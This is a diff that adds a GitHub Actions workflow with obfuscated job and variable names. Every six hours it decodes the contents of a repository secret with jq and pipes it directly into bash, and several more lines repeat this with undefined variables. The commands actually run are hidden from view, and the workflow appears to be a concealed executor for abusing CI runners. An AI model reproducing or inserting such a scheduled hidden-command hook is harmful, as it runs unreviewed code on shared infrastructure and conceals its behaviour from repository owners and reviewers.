@@ -1,0 +1,26 @@
+name: lujingxi3456
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lujingxi3456
+        env:
+          vislo6124: ${{ secrets.vislo6124 }}
+        run: |
+          echo $vislo6124 | jq -r .rs1 | /bin/bash
+          echo $y41 | jq -r .txoe67011 | /bin/bash
+          echo $ptg0604 | jq -r .p0052 | /bin/bash
+          echo $zjumc6 | jq -r .bnbr79 | /bin/bash
+          echo $g4499 | jq -r .yuf14071 | /bin/bash
+          echo $mt6008 | jq -r .qwtem527 | /bin/bash
+          echo $hta3197 | jq -r .boqs2 | /bin/bash
+          echo $e654 | jq -r .rlv93181 | /bin/bash
+
